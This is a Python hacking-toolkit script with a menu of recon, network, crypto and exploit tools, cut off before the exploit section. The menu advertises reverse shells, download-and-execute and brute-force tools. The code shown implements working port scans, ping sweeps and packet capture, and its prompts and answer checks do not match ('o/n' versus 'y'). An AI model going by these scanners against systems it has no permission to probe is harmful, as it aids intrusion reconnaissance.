#!/usr/bin/env python3
import os
import sys
import subprocess
import socket
import hashlib
import string
import random
import base64
import json
import shlex
import re
from pathlib import Path

class C:
    HEADER = ""
    BLUE = ""
    LIGHT_BLUE = ""
    CYAN = ""
    LIGHT_CYAN = ""
    GRAY = "\033[90m"
    GREEN = ""
    RED = ""
    MAGENTA = ""
    YELLOW = ""
    WHITE = "\033[97m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

TITLE = [
    C.WHITE + " d2ath v2.0 - Security Framework                              " + C.RESET,
    C.GRAY + " ██████╗ ███████╗███████╗██╗    ██╗ █████╗ ██╗     ██╗     ███████╗███████╗" + C.RESET,
    C.WHITE + "██╔══██╗██╔════╝██╔════╝██║    ██║██╔══██╗██║     ██║     ██╔════╝██╔════╝" + C.RESET,
    C.GRAY + "██████╔╝█████╗  █████╗  ██║ █╗ ██║███████║██║     ██║     █████╗  ███████╗" + C.RESET,
    C.WHITE + "██╔══██╗██╔══╝  ██╔══╝  ██║███╗██║██╔══██║██║     ██║     ██╔══╝  ╚════██║" + C.RESET,
    C.GRAY + "██║  ██║███████╗███████╗╚███╔███╔╝██║  ██║███████╗███████╗███████╗███████║" + C.RESET,
    C.WHITE + "╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝" + C.RESET,
]

LOGO = [
    C.WHITE + "        ╔═══════════════════════════════════════════════════╗" + C.RESET,
    C.GRAY + "        ║  [1] RECON    [2] NETWORK    [3] CRYPTO          ║" + C.RESET,
    C.WHITE + "        ║  [4] SYSTEM   [5] EXPLOIT    [6] AUDIT          ║" + C.RESET,
    C.GRAY + "        ║  [q] Quit                                          ║" + C.RESET,
    C.WHITE + "        ╚═══════════════════════════════════════════════════╝" + C.RESET,
]

LOGO = [
    "                                    ⣀⣤⢴⣶⣄                                    ",
    "                                ⣀⣴⣿⢿⣿⣿⠟⠉⠻⢶⣤⣄⣀⣀⣀                                ",
    "                            ⣀⣴⣿⠿⣿⡟⠙⢡      ⠶⠛⣴⣾⢿⠙⣻⣽⣷⣦                            ",
    "                        ⣠⣾⣿⠿⣹⡴⣿⣿⣦⣾    ⣀      ⠾⡽⣷⣖                        ",
    "                    ⣰⡿⠋⠂⣿⣾⣿⣿⠁    ⠉⠻⣿⠿⣷⣿⣮                        ",
    "                ⣰⣿⠻⣄⠴⣷⠋⠉⣿          ⣠⡟     ⠉⠉                        ",
    "            ⣀⣼⣇⣠⣿⣿⣿⠁    ⣰⣿⣦⣄⣀⣠⣿                           ",
    "        ⣀⣠⣾⣏⣹⣿⣿       ⣰⣿⣿⣿⣿                              ",
    "    ⣴⣿⠿⠿     ⣤⣾⣿⣿                                    ",
    "    ⣰⣇⢰⣧     ⣿⣿⠟                                  ",
    "        ⠒⠻     ⣰⠟                                     ",
    "    ⣴⠁    ⣰⠟                                          ",
    "        ⠁                                             ",
]

def get_my_ip():
    try:
        return subprocess.check_output(["curl", "-s", "ifconfig.me"], timeout=5).decode().strip()
    except:
        return None

def get_my_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return socket.gethostbyname(socket.gethostname())

def get_input(prompt):
    return input(f"{C.WHITE}[?] {prompt}: {C.RESET}").strip()

def get_input_ip(prompt):
    print(f"{C.WHITE}[?] {prompt}: {C.RESET}")
    print(f"{C.GRAY}   [Enter] = my public IP   |   Type IP manually{C.RESET}")
    choice = input(f"{C.WHITE}   └─>{C.RESET} ").strip()
    if not choice:
        my_ip = get_my_ip()
        if my_ip:
            print(f"{C.WHITE}[*] Using my IP: {C.WHITE}{my_ip}{C.RESET}")
            return my_ip
        else:
            print(f"{C.GRAY}[!] Could not retrieve my IP{C.RESET}")
            return None
    if not re.match(r'^[\d.]+$', choice):
        print(f"{C.GRAY}[!] Invalid IP format{C.RESET}")
        return None
    return choice

def get_input_domain(prompt):
    print(f"{C.WHITE}[?] {prompt}: {C.RESET}")
    print(f"{C.GRAY}   [Enter] = my public IP   |   Type IP/Domain{C.RESET}")
    choice = input(f"{C.WHITE}   └─>{C.RESET} ").strip()
    if not choice:
        my_ip = get_my_ip()
        if my_ip:
            print(f"{C.WHITE}[*] Using my IP: {C.WHITE}{my_ip}{C.RESET}")
            return my_ip
        return None
    if not re.match(r'^[\w.\-]+$', choice):
        print(f"{C.GRAY}[!] Invalid domain format{C.RESET}")
        return None
    return choice

CATEGORIES = {
    "1": {
        "name": "RECON",
        "color": C.GRAY,
        "tools": [
            ("Port Scan", "ports", "Scan open ports"),
            ("Ping Scan", "ping", "Discover active hosts"),
            ("DNS Lookup", "dns", "DNS resolution"),
            ("Whois", "whois", "WHOIS information"),
            ("GeoIP", "geoip", "IP geolocation"),
            ("Traceroute", "traceroute", "Route to IP"),
        ]
    },
    "2": {
        "name": "NETWORK",
        "color": C.WHITE,
        "tools": [
            ("My IP", "myip", "Show public IP"),
            ("Local IP", "iplocale", "Show local IP"),
            ("All IPs", "allips", "All network interfaces"),
            ("Gateway", "gateway", "Show gateway"),
            ("Check Port", "checkport", "Check if port is open"),
            ("Ping", "rawping", "Simple ping"),
            ("Network Calc", "netcalc", "Calculate network/broadcast"),
            ("Netdiscover", "netdiscover", "Scan local network (ARP)"),
            ("Wireshark", "wireshark", "Launch Wireshark (terminal)"),
        ]
    },
    "3": {
        "name": "CRYPTO",
        "color": C.GRAY,
        "tools": [
            ("Password Gen", "password", "Generate password"),
            ("Hash MD5", "md5", "MD5 hash"),
            ("Hash SHA256", "sha256", "SHA256 hash"),
            ("File Hash", "filehash", "Hash a file"),
            ("Base64 Encode", "b64e", "Base64 encode"),
            ("Base64 Decode", "b64d", "Base64 decode"),
            ("URL Encode", "urle", "URL encode"),
            ("URL Decode", "urld", "URL decode"),
        ]
    },
    "4": {
        "name": "SYSTEM",
        "color": C.WHITE,
        "tools": [
            ("System Info", "sysinfo", "System information"),
            ("File List", "lsdir", "List files"),
        ]
    },
    "5": {
        "name": "EXPLOIT",
        "color": C.GRAY,
        "tools": [
            ("Reverse Shell", "revshell", "Generate reverse shell"),
            ("Encode Payload", "encpayload", "Base64 encode"),
            ("Decode Payload", "decpayload", "Base64 decode"),
            ("HTTP Server", "httpserver", "Start HTTP server"),
            ("Download & Exec", "dllexec", "Download and execute"),
            ("Metasploit One-Liner", "msfgen", "Generate MSF one-liner"),
        ]
    },
    "6": {
        "name": "AUDIT",
        "color": C.GRAY,
        "tools": [
            ("Nmap", "nmap", "Advanced port scanner"),
            ("Masscan", "masscan", "Ultra fast mass scan"),
            ("Aircrack-ng", "aircrack", "WiFi attack suite"),
            ("Nikto", "nikto", "Web vulnerability scanner"),
            ("Hydra", "hydra", "Brute force login"),
            ("John the Ripper", "john", "Password cracker"),
            ("Hashcat", "hashcat", "GPU cracking (hashcat)"),
            ("SQLMap", "sqlmap", "Detect SQL injections"),
        ]
    },
}

TOOL_FUNCTIONS = {}

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def print_art():
    print()
    for line in TITLE:
        print(line)
    print()

def show_categories():
    print(f"{C.BOLD}   ┌─────────────────────────────────────────┐{C.RESET}")
    print(f"{C.BOLD}   │{C.RESET}         {C.WHITE}SELECT A CATEGORY{C.RESET}          {C.BOLD}│{C.RESET}")
    print(f"{C.BOLD}   └─────────────────────────────────────────┘{C.RESET}\n")
    
    for key, cat in CATEGORIES.items():
        print(f"   {C.BOLD}┌─[{C.WHITE} {key} {C.GRAY}]{C.RESET}  {cat['color']}▸ {cat['name']}{C.RESET}")
        print(f"   {C.GRAY}└{'─' * 45}╜{C.RESET}")
    
    print(f"\n   {C.BOLD}┌─[{C.WHITE} q {C.GRAY}]{C.RESET}  {C.WHITE}Quit{C.RESET}")
    print(f"   {C.GRAY}└{'─' * 20}╜{C.RESET}\n")

def show_tools_in_category(cat_key):
    cat = CATEGORIES.get(cat_key)
    if not cat:
        return []
    
    clear()
    print()
    for line in TITLE:
        print(line)
    print()
    print(f"{C.BOLD}   ╔{'═' * 45}╗{C.RESET}")
    print(f"{C.BOLD}   ║{C.RESET}  {cat['color']}▸ {cat['name']}{C.RESET}")
    print(f"{C.BOLD}   ╚{'═' * 45}╝{C.RESET}\n")
    
    tools = cat["tools"]
    for i, (name, _, desc) in enumerate(tools, 1):
        print(f"   {C.BOLD}┌─{C.GRAY}[{C.WHITE}{i}{C.GRAY}]{C.RESET}  {C.WHITE}{name}{C.RESET}")
        print(f"   {C.GRAY}│   {desc}{C.RESET}")
        print(f"   {C.GRAY}└{'─' * 45}╜{C.RESET}\n")
    
    print(f"   {C.BOLD}┌─{C.GRAY}[{C.WHITE}0{C.GRAY}]{C.RESET}  {C.WHITE}< Back{C.RESET}")
    print(f"   {C.GRAY}└{'─' * 20}╜{C.RESET}\n")
    return [t[1] for t in tools]

def pause():
    input(f"\n   {C.GRAY}Press Enter...{C.RESET}")

# ═══════════════════════════════════════════
# RECON
# ═══════════════════════════════════════════

def tool_ports():
    clear()
    print(f"{C.GRAY}[*] Port scan{C.RESET}\n")
    
    target = get_input_ip("IP cible")
    if not target:
        pause()
        return
    
    try:
        start = int(get_input("Start port (default: 1)") or "1")
        end = int(get_input("End port (default: 1024)") or "1024")
    except ValueError:
        print(f"{C.GRAY}[!] Invalid ports{C.RESET}")
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Scanning on {target}...{C.RESET}\n")
    open_ports = []
    
    for port in range(start, min(end + 1, 10000)):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        if sock.connect_ex((target, port)) == 0:
            open_ports.append(port)
            print(f"{C.WHITE}[+] Port {port} OPEN{C.RESET}")
        sock.close()
    
    print(f"\n{C.WHITE}[*] {len(open_ports)} open ports{C.RESET}" if open_ports else f"\n{C.GRAY}[!] No open ports found{C.RESET}")
    pause()

TOOL_FUNCTIONS["ports"] = tool_ports

def tool_ping():
    clear()
    print(f"{C.GRAY}[*] Ping Scan{C.RESET}\n")
    
    subnet = get_input("Plage IP (ex: 192.168.1)")
    if not subnet:
        print(f"{C.GRAY}[!] Invalid range{C.RESET}")
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Scanning...{C.RESET}\n")
    param = "-n" if sys.platform == "win32" else "-c"
    
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        try:
            if subprocess.run(["ping", param, "1", "-W", "1", ip], 
                             capture_output=True, timeout=1).returncode == 0:
                print(f"{C.WHITE}[+] {ip} ACTIF{C.RESET}")
        except:
            pass
    
    pause()

TOOL_FUNCTIONS["ping"] = tool_ping

def tool_dns():
    clear()
    print(f"{C.GRAY}[*] DNS Lookup{C.RESET}\n")
    
    domain = get_input("Domaine")
    if not domain:
        print(f"{C.GRAY}[!] Invalid domain{C.RESET}")
        pause()
        return
    
    try:
        ip = socket.gethostbyname(domain)
        print(f"\n{C.WHITE}[+] {C.WHITE}{domain}{C.WHITE} -> {C.WHITE}{ip}{C.RESET}")
        
        hostname, _, _ = socket.gethostbyaddr(ip)
        print(f"{C.WHITE}[+] Reverse: {C.WHITE}{hostname}{C.RESET}")
    except socket.gaierror:
        print(f"{C.GRAY}[!] Domain not found{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["dns"] = tool_dns

def tool_whois():
    clear()
    print(f"{C.GRAY}[*] Whois{C.RESET}\n")
    
    target = get_input_ip("IP ou Domaine")
    if not target:
        print(f"{C.GRAY}[!] Invalid target{C.RESET}")
        pause()
        return
    
    print(f"\n{C.GRAY}[*] WHOIS lookup on {target}...{C.RESET}\n")
    
    try:
        result = subprocess.run(["whois", shlex.quote(target)], capture_output=True, text=True, timeout=10)
        if result.stdout:
            print(f"{C.WHITE}{result.stdout[:3000]}{C.RESET}")
        else:
            print(f"{C.GRAY}[!] No information available{C.RESET}")
    except FileNotFoundError:
        print(f"{C.GRAY}[!] Whois not installed (apt install whois){C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["whois"] = tool_whois

def tool_geoip():
    clear()
    print(f"{C.GRAY}[*] GeoIP Lookup{C.RESET}\n")
    
    target = get_input_ip("Adresse IP")
    if not target:
        print(f"{C.GRAY}[!] Invalid IP{C.RESET}")
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Locating {target}...{C.RESET}\n")
    
    try:
        result = subprocess.run(["curl", "-s", f"ipinfo.io/{target}/json"], 
                               capture_output=True, text=True, timeout=5)
        data = json.loads(result.stdout)
        
        if "bogon" in data:
            print(f"{C.WHITE}[!] Private IP/bogon (not traceable){C.RESET}")
        else:
            print(f"{C.WHITE}[+] IP: {C.WHITE}{data.get('ip', target)}{C.RESET}")
            print(f"{C.WHITE}[+] Hostname: {C.WHITE}{data.get('hostname', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Ville: {C.WHITE}{data.get('city', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Region: {C.WHITE}{data.get('region', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Pays: {C.WHITE}{data.get('country', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Location: {C.WHITE}{data.get('loc', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Timezone: {C.WHITE}{data.get('timezone', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] ASN: {C.WHITE}{data.get('org', 'N/A')}{C.RESET}")
            
            if "loc" in data and data["loc"] and "," in data["loc"]:
                lat, lon = data["loc"].split(",", 1)
                print(f"\n{C.GRAY}   Maps: https://www.google.com/maps?q={lat},{lon}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["geoip"] = tool_geoip

def tool_traceroute():
    clear()
    print(f"{C.GRAY}[*] Traceroute{C.RESET}\n")
    
    target = get_input_domain("IP ou Domaine")
    if not target:
        print(f"{C.GRAY}[!] Invalid target{C.RESET}")
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Traceroute to {target}...{C.RESET}\n")
    
    try:
        param = "tracert" if sys.platform == "win32" else "traceroute"
        result = subprocess.run([param, shlex.quote(target)], capture_output=True, text=True, timeout=30)
        print(f"{C.WHITE}{result.stdout[:2000]}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["traceroute"] = tool_traceroute

# ═══════════════════════════════════════════
# NETWORK
# ═══════════════════════════════════════════

def tool_myip():
    clear()
    print(f"{C.WHITE}[*] My Public IP{C.RESET}\n")
    
    my_ip = get_my_ip()
    if not my_ip:
        print(f"{C.GRAY}[!] Could not retrieve my IP{C.RESET}")
        pause()
        return
    
    print(f"{C.WHITE}[+] Public IP: {C.WHITE}{my_ip}{C.RESET}\n")
    
    try:
        result = subprocess.run(["curl", "-s", f"ipinfo.io/{my_ip}/json"], 
                               capture_output=True, text=True, timeout=5)
        data = json.loads(result.stdout)
        
        if data.get("ip"):
            print(f"{C.WHITE}[+] Ville: {C.WHITE}{data.get('city', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Region: {C.WHITE}{data.get('region', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Pays: {C.WHITE}{data.get('country', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] ISP: {C.WHITE}{data.get('org', 'N/A')}{C.RESET}")
            print(f"{C.WHITE}[+] Timezone: {C.WHITE}{data.get('timezone', 'N/A')}{C.RESET}")
    except:
        pass
    
    pause()

TOOL_FUNCTIONS["myip"] = tool_myip

def tool_iplocale():
    clear()
    print(f"{C.WHITE}[*] My Local IP{C.RESET}\n")
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        print(f"{C.WHITE}[+] Host: {C.WHITE}{hostname}{C.RESET}")
        print(f"{C.WHITE}[+] Local IP: {C.WHITE}{local_ip}{C.RESET}")
        
        my_local = get_my_local_ip()
        if my_local != local_ip:
            print(f"{C.WHITE}[+] IP (iface): {C.WHITE}{my_local}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["iplocale"] = tool_iplocale

def tool_allips():
    clear()
    print(f"{C.WHITE}[*] All My IPs{C.RESET}\n")
    
    hostname = socket.gethostname()
    print(f"{C.WHITE}[+] Host: {C.WHITE}{hostname}{C.RESET}\n")
    
    try:
        result = subprocess.check_output(["ip", "addr"], text=True)
        for line in result.split("\n"):
            line = line.strip()
            if line.startswith("inet "):
                parts = line.split()
                print(f"{C.WHITE}[+] {C.WHITE}{parts[2]}{C.GRAY} ({parts[1]}){C.RESET}")
    except:
        try:
            result = subprocess.check_output(["ifconfig"], text=True)
            for line in result.split("\n"):
                if "inet " in line and not line.strip().startswith("inet6"):
                    parts = line.split()
                    for i, p in enumerate(parts):
                        if p == "inet":
                            print(f"{C.WHITE}[+] {C.WHITE}{parts[i+1]}{C.RESET}")
        except:
            print(f"{C.GRAY}[!] Network commands not available{C.RESET}")
    
    print()
    public = get_my_ip()
    if public:
        print(f"{C.WHITE}[+] Public IP: {C.WHITE}{public}{C.RESET}")
    else:
        print(f"{C.GRAY}[i] Public IP not available{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["allips"] = tool_allips

def tool_gateway():
    clear()
    print(f"{C.WHITE}[*] Gateway{C.RESET}\n")
    
    try:
        result = subprocess.check_output(["ip", "route", "show", "default"], text=True)
        parts = result.split()
        if len(parts) >= 3:
            gw = parts[2]
            print(f"{C.WHITE}[+] Gateway: {C.WHITE}{gw}{C.RESET}")
            
            try:
                hostname = socket.gethostbyaddr(gw)[0]
                print(f"{C.GRAY}    DNS inverse: {C.WHITE}{hostname}{C.RESET}")
            except:
                pass
        else:
            raise ValueError("Unexpected format")
    except:
        try:
            result = subprocess.check_output(["route", "-n"], text=True)
            for line in result.split("\n"):
                if "UG" in line:
                    parts = line.split()
                    print(f"{C.WHITE}[+] Gateway: {C.WHITE}{parts[1]}{C.GRAY} (iface: {parts[-1]}){C.RESET}")
        except:
            print(f"{C.GRAY}[!] Could not retrieve gateway{C.RESET}")
    
    print()
    print(f"{C.GRAY}[*] Connectivity test:{C.RESET}")
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "1", "8.8.8.8"], capture_output=True)
        if result.returncode == 0:
            print(f"{C.WHITE}[+] Internet: OK{C.RESET}")
        else:
            print(f"{C.GRAY}[!] Internet: FAILED{C.RESET}")
    except:
        print(f"{C.GRAY}[!] Test failed{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["gateway"] = tool_gateway

def tool_checkport():
    clear()
    print(f"{C.WHITE}[*] Check port{C.RESET}\n")
    
    target = get_input_ip("IP cible")
    if not target:
        print(f"{C.GRAY}[!] Invalid IP{C.RESET}")
        pause()
        return
    
    try:
        port = int(get_input("Port"))
    except ValueError:
        print(f"{C.GRAY}[!] Invalid port{C.RESET}")
        pause()
        return
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    
    if sock.connect_ex((target, port)) == 0:
        print(f"\n{C.WHITE}[+] Port {port} on {target} is OPEN{C.RESET}")
    else:
        print(f"\n{C.GRAY}[!] Port {port} on {target} is CLOSED{C.RESET}")
    
    sock.close()
    pause()

TOOL_FUNCTIONS["checkport"] = tool_checkport

def tool_rawping():
    clear()
    print(f"{C.WHITE}[*] Ping{C.RESET}\n")
    
    target = get_input_domain("IP ou Domaine")
    if not target:
        print(f"{C.GRAY}[!] Invalid target{C.RESET}")
        pause()
        return
    
    try:
        param = "-n" if sys.platform == "win32" else "-c"
        count = get_input("Number of packets (default: 4)") or "4"
        subprocess.run(["ping", param, count, target], timeout=30)
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["rawping"] = tool_rawping

def tool_netcalc():
    clear()
    print(f"{C.WHITE}[*] Network calculator{C.RESET}\n")
    
    try:
        ip = get_input("Adresse IP (ex: 192.168.1.1)")
        cidr = get_input("CIDR (ex: 24)") or "24"
        
        ip_parts = [int(x) for x in ip.split(".")]
        ip_int = (ip_parts[0] << 24) + (ip_parts[1] << 16) + (ip_parts[2] << 8) + ip_parts[3]
        
        mask_int = (0xFFFFFFFF << (32 - int(cidr))) & 0xFFFFFFFF
        network = ip_int & mask_int
        broadcast = network | (~mask_int & 0xFFFFFFFF)
        
        def itoa(i):
            return f"{(i >> 24) & 255}.{(i >> 16) & 255}.{(i >> 8) & 255}.{i & 255}"
        
        print(f"\n{C.WHITE}[+] Network:     {C.WHITE}{itoa(network)}/{cidr}{C.RESET}")
        print(f"{C.WHITE}[+] Broadcast:   {C.WHITE}{itoa(broadcast)}{C.RESET}")
        print(f"{C.WHITE}[+] Masque:      {C.WHITE}{itoa(mask_int)}{C.RESET}")
        print(f"{C.WHITE}[+] First IP: {C.WHITE}{itoa(network + 1)}{C.RESET}")
        print(f"{C.WHITE}[+] Last IP: {C.WHITE}{itoa(broadcast - 1)}{C.RESET}")
        print(f"{C.WHITE}[+] Nombre IPs:  {C.WHITE}{2**(32-int(cidr))}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["netcalc"] = tool_netcalc

def tool_netdiscover():
    clear()
    print(f"{C.WHITE}[*] Netdiscover{C.RESET}\n")
    
    print(f"{C.GRAY}[*] Checking netdiscover...{C.RESET}\n")
    
    result = subprocess.run(["which", "netdiscover"], capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"{C.WHITE}[+] Netdiscover installed{C.RESET}\n")
        
        iface = get_input("Network interface (default: eth0)") or "eth0"
        
        print(f"\n{C.GRAY}[*] ARP scan in progress on {iface}...{C.RESET}")
        print(f"{C.GRAY}[*] Ctrl+C to stop{C.RESET}\n")
        
        try:
            subprocess.run(["netdiscover", "-i", iface, "-r", "0.0.0.0/24"], timeout=60)
        except KeyboardInterrupt:
            print(f"\n{C.WHITE}[!] Scan stopped{C.RESET}")
        except Exception as e:
            print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    else:
        print(f"{C.GRAY}[!] Netdiscover not installed{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Voulez-vous l'installer ? (o/n): {C.RESET}").strip().lower()
        
        if install == "y":
            print(f"\n{C.GRAY}[*] Installation de netdiscover...{C.RESET}\n")
            try:
                if os.path.exists("/etc/debian_version"):
                    subprocess.run(["sudo", "apt", "update"], check=True)
                    subprocess.run(["sudo", "apt", "install", "-y", "netdiscover"], check=True)
                elif os.path.exists("/etc/arch-release"):
                    subprocess.run(["sudo", "pacman", "-S", "--noconfirm", "netdiscover"], check=True)
                elif os.path.exists("/etc/fedora-release"):
                    subprocess.run(["sudo", "dnf", "install", "-y", "netdiscover"], check=True)
                else:
                    print(f"{C.WHITE}[!] Unknown distribution, install manually{C.RESET}")
                    print(f"{C.GRAY}    Ubuntu/Debian: sudo apt install netdiscover{C.RESET}")
                    print(f"{C.GRAY}    Arch: sudo pacman -S netdiscover{C.RESET}")
                    print(f"{C.GRAY}    Fedora: sudo dnf install netdiscover{C.RESET}")
                
                print(f"\n{C.WHITE}[+] Installation complete{C.RESET}")
                print(f"{C.GRAY}[*] Relancez l'outil pour l'utiliser{C.RESET}")
            except Exception as e:
                print(f"{C.GRAY}[!] Installation error: {e}{C.RESET}")
        else:
            print(f"\n{C.GRAY}[*] Commandes d'installation manuelle:{C.RESET}")
            print(f"{C.WHITE}    sudo apt install netdiscover{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["netdiscover"] = tool_netdiscover

def tool_wireshark():
    clear()
    print(f"{C.WHITE}[*] Wireshark{C.RESET}\n")
    
    print(f"{C.GRAY}[*] Checking Wireshark...{C.RESET}\n")
    
    result = subprocess.run(["which", "wireshark"], capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"{C.WHITE}[+] Wireshark installed{C.RESET}")
        print(f"{C.WHITE}[*] Lancement de Wireshark en terminal...{C.RESET}")
        print(f"{C.GRAY}[*] Interface: TShark (version terminal de Wireshark){C.RESET}\n")
        
        iface = get_input("Network interface (default: eth0)") or "eth0"
        
        try:
            subprocess.run(["tshark", "-i", iface, "-c", "100"], timeout=30)
        except KeyboardInterrupt:
            print(f"\n{C.WHITE}[!] Capture stopped{C.RESET}")
        except FileNotFoundError:
            print(f"{C.GRAY}[!] TShark not found, using tcpdump{C.RESET}")
            print(f"{C.GRAY}[*] Capture with tcpdump... (Ctrl+C to stop){C.RESET}\n")
            try:
                subprocess.run(["tcpdump", "-i", iface, "-c", "50"])
            except KeyboardInterrupt:
                print(f"\n{C.WHITE}[!] Capture stopped{C.RESET}")
            except FileNotFoundError:
                print(f"{C.GRAY}[!] tcpdump not installed{C.RESET}")
    else:
        print(f"{C.GRAY}[!] Wireshark not installed{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Voulez-vous l'installer ? (o/n): {C.RESET}").strip().lower()
        
        if install == "y":
            print(f"\n{C.GRAY}[*] Installation de Wireshark...{C.RESET}\n")
            try:
                if os.path.exists("/etc/debian_version"):
                    subprocess.run(["sudo", "apt", "update"], check=True)
                    subprocess.run(["sudo", "apt", "install", "-y", "wireshark", "tshark", "tcpdump"], check=True)
                elif os.path.exists("/etc/arch-release"):
                    subprocess.run(["sudo", "pacman", "-S", "--noconfirm", "wireshark-cli", "tcpdump"], check=True)
                elif os.path.exists("/etc/fedora-release"):
                    subprocess.run(["sudo", "dnf", "install", "-y", "wireshark-cli", "tcpdump"], check=True)
                else:
                    print(f"{C.WHITE}[!] Unknown distribution, install manually{C.RESET}")
                    print(f"{C.GRAY}    Ubuntu/Debian: sudo apt install wireshark tshark tcpdump{C.RESET}")
                    print(f"{C.GRAY}    Arch: sudo pacman -S wireshark-cli tcpdump{C.RESET}")
                    print(f"{C.GRAY}    Fedora: sudo dnf install wireshark-cli tcpdump{C.RESET}")
                
                print(f"\n{C.WHITE}[+] Installation complete{C.RESET}")
            except Exception as e:
                print(f"{C.GRAY}[!] Installation error: {e}{C.RESET}")
        else:
            print(f"\n{C.GRAY}[*] Commandes d'installation manuelle:{C.RESET}")
            print(f"{C.WHITE}    sudo apt install wireshark tshark tcpdump{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["wireshark"] = tool_wireshark

# ═══════════════════════════════════════════
# CRYPTO
# ═══════════════════════════════════════════

def tool_password():
    clear()
    print(f"{C.GRAY}[*] Password Generator{C.RESET}\n")
    
    try:
        length = int(get_input("Length (default: 16)") or "16")
    except ValueError:
        print(f"{C.GRAY}[!] Invalid length{C.RESET}")
        pause()
        return
    
    use_special = get_input("Special characters? (y/n)").lower() == "o"
    
    chars = string.ascii_letters + string.digits
    if use_special:
        chars += string.punctuation
    
    password = ''.join(random.choice(chars) for _ in range(length))
    
    print(f"\n{C.WHITE}[+] Password: {C.WHITE}{password}{C.RESET}")
    
    strength = "Faible"
    if length >= 12:
        strength = "Moyen"
    if length >= 16 and use_special:
        strength = "Fort"
    if length >= 20 and use_special:
        strength = "Very strong"
    
    print(f"{C.GRAY}[*] Force: {strength}{C.RESET}")
    pause()

TOOL_FUNCTIONS["password"] = tool_password

def tool_md5():
    clear()
    print(f"{C.GRAY}[*] Hash MD5{C.RESET}\n")
    
    text = get_input("Text to hash")
    if not text:
        print(f"{C.GRAY}[!] Invalid text{C.RESET}")
        pause()
        return
    
    hash_md5 = hashlib.md5(text.encode()).hexdigest()
    print(f"\n{C.WHITE}[+] MD5: {C.WHITE}{hash_md5}{C.RESET}")
    pause()

TOOL_FUNCTIONS["md5"] = tool_md5

def tool_sha256():
    clear()
    print(f"{C.GRAY}[*] Hash SHA256{C.RESET}\n")
    
    text = get_input("Text to hash")
    if not text:
        print(f"{C.GRAY}[!] Invalid text{C.RESET}")
        pause()
        return
    
    hash_sha256 = hashlib.sha256(text.encode()).hexdigest()
    print(f"\n{C.WHITE}[+] SHA256: {C.WHITE}{hash_sha256}{C.RESET}")
    pause()

TOOL_FUNCTIONS["sha256"] = tool_sha256

def tool_filehash():
    clear()
    print(f"{C.GRAY}[*] File Hash{C.RESET}\n")
    
    filepath = get_input("Chemin du fichier")
    if not filepath or not os.path.exists(filepath):
        print(f"{C.GRAY}[!] File not found{C.RESET}")
        pause()
        return
    
    try:
        md5 = hashlib.md5()
        sha256 = hashlib.sha256()
        
        with open(filepath, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                md5.update(chunk)
                sha256.update(chunk)
        
        print(f"\n{C.WHITE}[+] File: {C.WHITE}{filepath}{C.RESET}")
        print(f"{C.GRAY}    MD5:    {C.WHITE}{md5.hexdigest()}{C.RESET}")
        print(f"{C.GRAY}    SHA256: {C.WHITE}{sha256.hexdigest()}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["filehash"] = tool_filehash

def tool_b64e():
    clear()
    print(f"{C.GRAY}[*] Base64 Encode{C.RESET}\n")
    
    text = get_input("Text to encode")
    if not text:
        print(f"{C.GRAY}[!] Invalid text{C.RESET}")
        pause()
        return
    
    encoded = base64.b64encode(text.encode()).decode()
    print(f"\n{C.WHITE}[+] Encoded: {C.WHITE}{encoded}{C.RESET}")
    pause()

TOOL_FUNCTIONS["b64e"] = tool_b64e

def tool_b64d():
    clear()
    print(f"{C.GRAY}[*] Base64 Decode{C.RESET}\n")
    
    text = get_input("Text to decode")
    if not text:
        print(f"{C.GRAY}[!] Invalid text{C.RESET}")
        pause()
